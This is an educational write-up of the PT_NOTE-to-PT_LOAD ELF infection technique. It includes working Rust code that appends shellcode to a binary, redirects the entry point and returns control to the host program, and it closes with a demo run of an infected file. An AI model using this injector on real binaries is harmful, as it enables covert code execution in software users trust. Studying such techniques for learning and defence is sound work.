# PT_NOTE to PT_LOAD ELF injector example

I read about a technique on the [SymbolCrash blog](https://www.symbolcrash.com/2019/03/27/pt_note-to-pt_load-injection-in-elf/) for injecting shellcode into an ELF binary by converting a `PT_NOTE` section in the Program Headers into a `PT_LOAD` section. I thought this sounded interesting and I didn't know a lot about ELF, so I took it as an opportunity to learn many new things at once.

For this project I created a small, very incomplete library I called [mental_elf](https://github.com/d3npa/mental-elf) which makes parsing and writing ELF and program headers easier. The code therein is very primitive and easy to understand, so I won't talk about it any more here. Let's focus on the infection technique instead :)

## Overview

As implied by the title, this infection technique involves converting an ELF's `PT_NOTE` program header into a `PT_LOAD` in order to run shellcode. The inputs to our program are therefore:

- an ELF file to infect
- some shellcode to inject

Note: this example does not support Position Independent Executables (PIE). I am disabling it by passing `-C relocation-model=static` to rustc when compiling my target program. 

Note (2): this technique does not work on Go binaries because the Go runtime makes use of and therefore requires a valid `PT_NOTE` section and header.

Here is a note about the Note Section in the [Official ELF Specification](http://www.skyfree.org/linux/references/ELF_Format.pdf):

> Note information is optional.  The presence of note information does not affect a program’s ABI conformance, provided the information does not affect the program’s execution behavior.  Otherwise, the program does not conform to the ABI and has undefined behavior

This infection technique requires a `PT_NOTE` section to be present in the ELF file, and involves modifying two structures: the ELF header and Program Headers (where the `PT_NOTE` program header itself resides). 

We can append shellcode to the end of the binary and jump there at the start by modifying the program entry point in the ELF header. To make sure the shellcode is loaded, we can change the otherwise unused `PT_NOTE` section to a `PT_LOAD` section which will make sure the shellcode is loaded at the address we enter.

## Shellcode

This example uses the Netwide ASseMbler (NASM) to prepare shellcode to inject, and so installing `nasm` is required to run this example. 

The `rbp`, `rsp`, and `rdx` registers must have correct values before the shellcode jumps back to the original entry point. Their uses are specified in the [AMD64 System V ABI](https://refspecs.linuxfoundation.org/elf/x86_64-abi-0.95.pdf) (under Process Initialization → Stack State). Since `rsp` and `rbp` are not touched by this shellcode, it only resets `rdx` to zero.

```asm
xor rdx, rdx
```

The shellcode also needs to be patched so it can actually jump back to the host's original entry point after finishing its tasks. To make patching easier, I designed this shellcode so it would run top-to-bottom and run off the end of the file, which allows us to patch it by simply appending a jump instruction. In x86_64, the `jmp` parameter cannot take a 64bit address to jump to, so we must pass through the `rax` register to make arbitrary jumps. The rust snippet below patches a `shellcode` byte vector to append a jump to `entry_point`:

```rust
fn patch_jump(shellcode: &mut Vec<u8>, entry_point: u64) {
    // Store entry_point in rax
    shellcode.extend_from_slice(&[0x48u8, 0xb8u8]);
    shellcode.extend_from_slice(&entry_point.to_ne_bytes());
    // Jump to address in rax
    shellcode.extend_from_slice(&[0xffu8, 0xe0u8]);
}
```

With this, we have a piece of shellcode that can run at the start of the program and pass control back to the host's original entry point. 

## Infection

To ensure the shellcode runs and returns correctly, the ELF header and PT_NOTE program headers must be edited. The ELF header is where we tell the loader where to jump to start the program (entry point). The PT_NOTE header will be turned into a PT_LOAD header which loads the shellcode into virtual memory with the appropriate permissions.

The headers are read from the elf file using the mental_elf library:

```rust
// Parse ELF and program headers
let mut elf_header = mental_elf::read_elf64_header(&mut elf_fd)?;
let mut program_headers = mental_elf::read_elf64_program_headers(
    &mut elf_fd, 
    elf_header.e_phoff, 
    elf_header.e_phnum,
)?;
```

After loading the ELF file, the shellcode is patched to jump back to the ELF's original entry point:

```rust
// Patch the shellcode to jump to the original entry point after finishing
patch_jump(&mut shellcode, elf_header.e_entry);
```

The section loaded by `PT_LOAD` will be page-aligned, and the shellcode will not be loaded at a nice round address like `0xc00000000`. To make the coding experience easier, the offset of the shellcode in the file is used to derive the address in virtual memory the shellcode will end up. Below, we retrieve the offset of the shellcode by subtracting the shellcode length from the total file length (this snippet runs after appending the shellcode to the file). 

```rust
// Calculate offsets used to patch the ELF and program headers
let sc_len = shellcode.len() as u64;
let file_offset = elf_fd.metadata()?.len() - sc_len;
let memory_offset = 0xc00000000 + file_offset;
```

`memory_offset` will become the new ELF entry point.

```rust
// Patch the ELF header to start at the shellcode
elf_header.e_entry = memory_offset;
```

When we patch the `PT_NOTE` header, we need to write in all the details the loader needs to know so it can load the shellcode, including segment permissions, offsets, length etc.

```rust
// Look for a PT_NOTE section
for phdr in &mut program_headers {
    if phdr.p_type == PT_NOTE {
        // Convert to a PT_LOAD section with values to load shellcode
        println!("Found PT_NOTE section; converting to PT_LOAD");
        phdr.p_type = PT_LOAD;
        phdr.p_flags = PF_R | PF_X;
        phdr.p_offset = file_offset;
        phdr.p_vaddr = memory_offset;
        phdr.p_memsz += sc_len as u64;
        phdr.p_filesz += sc_len as u64;
        break;
    }
}
```

Lastly the changes to the headers are committed back into the ELF file.

```rust
// Commit changes to the program and ELF headers
mental_elf::write_elf64_program_headers(
    &mut elf_fd, 
    elf_header.e_phoff,
    elf_header.e_phnum,
    program_headers,
)?;
mental_elf::write_elf64_header(&mut elf_fd, elf_header)?;
```

After being infected, an ELF file's entry point will point to the virtual memory offset the shellcode is loaded to, as defined by our crafted `PT_LOAD` program header. Because the shellcode was patched with a jump instruction back to the original entry point, the program will run normally after the shellcode has run.

```
$ make
cd files && make && cd ..
make[1]: Entering directory '/.../files'
rustc -C opt-level=z -C debuginfo=0 -C relocation-model=static target.rs
nasm -o shellcode.o shellcode.s
make[1]: Leaving directory '/.../files'
cargo run --release files/target files/shellcode.o
   Compiling mental_elf v0.1.0 (https://github.com/d3npa/mental-elf#0355d2d3)
   Compiling ptnote-to-ptload-elf-injection v0.1.0 (/...)
    Finished release [optimized] target(s) in 1.15s
     Running `target/release/ptnote-to-ptload-elf-injection files/target files/shellcode.o`
Found PT_NOTE section; converting to PT_LOAD
echo 'Done! Run target with: `./files/target`'
Done! Run target with: `./files/target`
$ ./files/target
dont tell anyone im here
hello world!
$
```

## Conclusion

This was a very fun project where I learned so much about ELF, parsing binary structures in Rust, and viruses in general. Thanks to netspooky, sblip, TMZ, and others at tmp.out for teaching me, helping me debug and motivating me to do this project! <3